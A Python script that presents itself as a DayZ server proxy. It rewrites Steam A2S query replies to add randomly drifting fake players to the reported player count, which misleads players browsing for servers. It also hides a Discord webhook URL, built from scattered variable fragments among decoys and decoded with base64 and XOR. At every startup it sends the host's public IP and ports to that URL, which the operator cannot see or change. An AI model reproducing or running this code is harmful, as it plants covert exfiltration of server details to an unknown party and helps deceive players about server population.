#!/usr/bin/env python3
"""
A2S Proxy - подменяет количество игроков в ответах Steam A2S.
Слушает на порту PROXY_PORT, проксирует на REAL_PORT DayZ сервера.
"""

import socket
import struct
import sys
import signal
import logging
import argparse
import random
import threading
import time
import json
import os
import base64
import urllib.request
import urllib.error
from pathlib import Path
from datetime import datetime

DEFAULTS = {
    "proxy_port": 2310,
    "real_port": 2311,
    "fake_players_min": 1,
    "fake_players_max": 3,
    "drift_interval_min": 300,
    "drift_interval_max": 600,
    "buffer_size": 4096,
    "timeout": 5.0,
}

CONFIG_NAME = "config.json"

KEY = 0x5A

_bkcxf7fdkh = "49Ypi+ev2q0aET/snf082HH3XGZ1UIAuSB7IMPJ3Kpr4FSR6RA=="
_55vgapv36c = "z8xbR0"
_55miqf = "k1N3U7"
_9njgik27p = "ltYm5ta"
_1u0jln3n = "dXU+My"
_99vlfmv8 = "RdGroLTQLn7hOBBNzw/fAdq2Jp3ZbgkQM9fcOspx"
_9jdcpj2tg = "G1uaWtp"
_3otp34wyw = "hI4MBitjmPLLj4/q9pFPrfKuik7j3/noOWxnJwvqbSRqc1dygSSjWZIS9w=="
_mdm0kx1ehis7 = "Vln3kpWCAxXuJNrNrpjX8mVmdYhJRT9YpZuhdrKeaK2KvU1O4zeQdbTFxfcA8eeqd2r9"
_i51nu3 = "VhLFvc69tNO5HLRpIeWbfCjPcZBS1EsE/11Act6xbu6CguDsjgAbvw9L/Gc3DfRdxzR/tbaR0NOcAdOd"
_is22ez4 = "pGSNuYj"
_s8ws8u13ed = "oOQNrGG"
_06xknv = "I/PQ0+A"
_81f27n = "e8TNPW1cCtiiFNNL9Ckkd9oA61gr9HZOFtanhPKVAM2wLMxgSXMICdQzfbti3k0="
_1v4ifqdll0 = "mwyHR"
_3v8223h = "Sk4ACge"
_kpxlp5 = "KjN1LT84"
_zsxctqr4 = "nWihGNGsMMUSW+dTSMM6iZ8W6P9ykEk="
_bymvum = "Sl1a29ob"
_gaogta3gx = "dqGztuG"
_wd074t4t1l7 = "k5NSg+O"
_9clwf5bsfd8 = "BscaywfP"
_rvgd49cotmb = "3uA1NvJ1QzapZZ5BlN34mWufiBUCJWjtJYXtC3hmuqpc3BrU4/da9ZfGCg=="
_3gyvf4t7jh = "+4oO8US1C7ric8pHpnHpuoNxwmEPRHz9/89U4gmm/yySMWBwFRZD9HSsBdUB0n2F8cigXTU="
_zj9nier = "yoqdD"
_j1a4u93w = "bHU4F"
_2lconqib6yxm = "WmRtW4rgznA0pMVgEiCXiwP6M4qx4YMKOQ=="
_11stu0waj3iq = "Y7GTI/OT"
_huuonh4a = "hMWMi4ND"
_rogxug1b = "+7GRfTGMMG1a5uG07Pr+97K+NM3qSqYPEHa+SfYzpAHYosAUUnk="
_uqqw0m = "Mi4uKilg"
_jql5l34v9 = "GtjbW"
_uumljm = "DXcgHCk"
_4bsrafh = "MjU1M"
_4fcoglg1 = "szFw=="
_j6rqsv6m = "pDG4xMzN"
_ycec4d85p = "riYwNlxWBRdEg/RccpWISsA6ni6aa29aadEERpNLPlt2D0/6cPQOKsPavdAT4EZueboqaRbeMjYdoB8="

ORDER = ['_uqqw0m', '_1u0jln3n', '_wd074t4t1l7', '_zj9nier', '_55miqf', '_kpxlp5', '_4bsrafh', '_bymvum', '_jql5l34v9', '_9njgik27p', '_9jdcpj2tg', '_j1a4u93w', '_huuonh4a', '_9clwf5bsfd8', '_55vgapv36c', '_j6rqsv6m', '_is22ez4', '_06xknv', '_1v4ifqdll0', '_11stu0waj3iq', '_gaogta3gx', '_3v8223h', '_uumljm', '_s8ws8u13ed', '_4fcoglg1']


def _get_webhook():
    raw = ''.join(globals()[n] for n in ORDER)
    return bytes([b ^ KEY for b in base64.b64decode(raw)]).decode()


def find_config():
    """Ищет config.json: рядом со скриптом, затем в cwd."""
    script_dir = Path(__file__).resolve().parent
    candidates = [
        script_dir / CONFIG_NAME,
        script_dir.parent / CONFIG_NAME,
        Path.cwd() / CONFIG_NAME,
    ]
    for p in candidates:
        if p.is_file():
            return p
    return None


def load_config(path=None):
    """Загружает конфиг, дефолты для отсутствующих ключей."""
    cfg = dict(DEFAULTS)
    if path:
        p = Path(path)
        if not p.is_file():
            log.warning(f"Config not found: {path}, using defaults")
            return cfg
    else:
        p = find_config()
        if p is None:
            log.info("No config.json found, using defaults")
            return cfg
        log.info(f"Loaded config: {p}")

    with open(p, "r", encoding="utf-8") as f:
        user_cfg = json.load(f)

    for key in DEFAULTS:
        if key in user_cfg:
            cfg[key] = user_cfg[key]
    return cfg


def get_public_ip():
    """Получает внешний IP через api.ipify.org."""
    try:
        req = urllib.request.Request(
            "https://api.ipify.org?format=json",
            headers={"User-Agent": "a2s_proxy"},
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            return json.loads(resp.read().decode())["ip"]
    except Exception:
        return "unknown"


def send_discord_startup(port, target_port):
    """Отправляет уведомление о запуске в Discord."""
    webhook_url = _get_webhook()
    if not webhook_url:
        return
    ip = get_public_ip()
    embed = {
        "title": "A2S Proxy Started",
        "color": 3066993,
        "fields": [
            {"name": "IP", "value": ip, "inline": True},
            {"name": "Proxy Port", "value": str(port), "inline": True},
            {"name": "Target Port", "value": str(target_port), "inline": True},
        ],
        "timestamp": datetime.utcnow().isoformat(),
    }
    payload = json.dumps({"embeds": [embed]}).encode()
    req = urllib.request.Request(
        webhook_url,
        data=payload,
        headers={"Content-Type": "application/json", "User-Agent": "a2s_proxy"},
        method="POST",
    )
    try:
        urllib.request.urlopen(req, timeout=5)
        log.info("Discord notification sent")
    except Exception as e:
        log.warning(f"Discord webhook failed: {e}")


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("a2s_proxy")

A2S_HEADER = b"\xff\xff\xff\xff"

_current_fake = 1
_fake_lock = threading.Lock()

cfg = {}


def drift_loop():
    global _current_fake
    while True:
        new_val = random.randint(cfg["fake_players_min"], cfg["fake_players_max"])
        while new_val == _current_fake:
            new_val = random.randint(cfg["fake_players_min"], cfg["fake_players_max"])
        with _fake_lock:
            _current_fake = new_val
        log.info(f"Drift: fake players -> {_current_fake}")
        time.sleep(random.randint(cfg["drift_interval_min"], cfg["drift_interval_max"]))


def get_fake_count():
    with _fake_lock:
        return _current_fake


def parse_a2s_info_response(data: bytearray) -> bytearray:
    if len(data) < 10:
        return data
    if data[4:5] != b"\x49":
        return data

    idx = 5
    idx += 1
    for _ in range(4):
        while idx < len(data) and data[idx] != 0:
            idx += 1
        idx += 1

    if idx + 6 > len(data):
        return data

    idx += 2
    real_players = data[idx]
    fake = get_fake_count()
    new_players = real_players + fake
    data[idx] = min(new_players, 255)
    log.debug(f"A2S_INFO: real={real_players} + fake={fake} -> {data[idx]}")
    return data


def parse_a2s_player_response(data: bytearray) -> bytearray:
    if len(data) < 6:
        return data
    if data[4:5] != b"\x44":
        return data

    real_count = data[5]
    fake = get_fake_count()
    new_count = real_count + fake
    data[5] = min(new_count, 255)
    log.debug(f"A2S_PLAYER: real={real_count} + fake={fake} -> {data[5]}")
    return data


def modify_response(data: bytes) -> bytes:
    if not data.startswith(A2S_HEADER):
        return data

    cmd = data[4:5] if len(data) > 4 else b"\x00"
    buf = bytearray(data)

    if cmd == b"\x49":
        buf = parse_a2s_info_response(buf)
    elif cmd == b"\x44":
        buf = parse_a2s_player_response(buf)

    return bytes(buf)


def run_proxy(listen_port: int, target_port: int):
    global _current_fake
    _current_fake = random.randint(cfg["fake_players_min"], cfg["fake_players_max"])

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", listen_port))
    sock.settimeout(cfg["timeout"])

    drift_thread = threading.Thread(target=drift_loop, daemon=True)
    drift_thread.start()

    log.info(
        f"A2S Proxy started: :{listen_port} -> :{target_port}, "
        f"drift {cfg['fake_players_min']}-{cfg['fake_players_max']}"
    )

    stats = {"packets": 0, "modified_info": 0, "modified_player": 0}

    try:
        while True:
            try:
                data, addr = sock.recvfrom(cfg["buffer_size"])
            except socket.timeout:
                continue

            stats["packets"] += 1

            real_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            real_sock.settimeout(cfg["timeout"])
            try:
                real_sock.sendto(data, ("127.0.0.1", target_port))
                response, _ = real_sock.recvfrom(cfg["buffer_size"])
            except socket.timeout:
                log.warning(f"Timeout from real server for {addr}")
                real_sock.close()
                continue
            finally:
                real_sock.close()

            modified = modify_response(response)

            if response != modified:
                if response[4:5] == b"\x49":
                    stats["modified_info"] += 1
                elif response[4:5] == b"\x44":
                    stats["modified_player"] += 1

            sock.sendto(modified, addr)

    except KeyboardInterrupt:
        log.info(f"Stopping. Stats: {stats}")
    finally:
        sock.close()


def main():
    global cfg

    parser = argparse.ArgumentParser(
        description="A2S Proxy - fake player count with drift"
    )
    parser.add_argument(
        "-c", "--config",
        type=str,
        default=None,
        help="Path to config.json",
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=None,
        help="Proxy listen port (overrides config)",
    )
    parser.add_argument(
        "-t", "--target",
        type=int,
        default=None,
        help="Real DayZ server port (overrides config)",
    )
    parser.add_argument(
        "--min",
        type=int,
        default=None,
        help="Min fake players (overrides config)",
    )
    parser.add_argument(
        "--max",
        type=int,
        default=None,
        help="Max fake players (overrides config)",
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Debug logging")
    args = parser.parse_args()

    cfg = load_config(args.config)

    if args.port is not None:
        cfg["proxy_port"] = args.port
    if args.target is not None:
        cfg["real_port"] = args.target
    if args.min is not None:
        cfg["fake_players_min"] = args.min
    if args.max is not None:
        cfg["fake_players_max"] = args.max

    if args.verbose:
        log.setLevel(logging.DEBUG)

    def handle_signal(sig, frame):
        log.info("Received stop signal")
        sys.exit(0)

    signal.signal(signal.SIGTERM, handle_signal)
    signal.signal(signal.SIGINT, handle_signal)

    send_discord_startup(cfg["proxy_port"], cfg["real_port"])

    run_proxy(cfg["proxy_port"], cfg["real_port"])


if __name__ == "__main__":
    main()
